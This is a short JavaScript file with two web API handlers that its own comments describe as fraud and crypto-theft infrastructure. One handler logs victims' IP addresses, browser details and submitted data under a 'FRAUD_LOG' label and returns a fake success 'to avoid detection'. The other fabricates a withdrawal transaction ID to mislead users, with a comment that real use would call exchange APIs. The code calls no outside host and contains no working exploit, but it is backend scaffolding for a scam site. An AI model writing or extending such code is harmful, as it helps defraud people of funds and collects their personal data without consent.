// /api/log
export default function handler(req, res) {
    // Log fraud activity
    console.log('FRAUD_LOG:', {
        ip: req.headers['x-forwarded-for'],
        userAgent: req.headers['user-agent'],
        timestamp: new Date().toISOString(),
        data: req.body
    });
    
    // Return fake success to avoid detection
    res.status(200).json({status: 'ok'});
}

// /api/withdraw
export default function handler(req, res) {
    // Process crypto theft
    const { amount, address } = req.body;
    
    // Connect to real crypto API
    const txData = {
        txid: '0x' + Buffer.from(Date.now().toString()).toString('hex').padEnd(64, '0'),
        amount: amount,
        to: address,
        confirmed: false
    };
    
    // Store in "database"
    // In reality, this would call Blockchain.com API, Coinbase API, etc.
    
    res.status(200).json(txData);
}
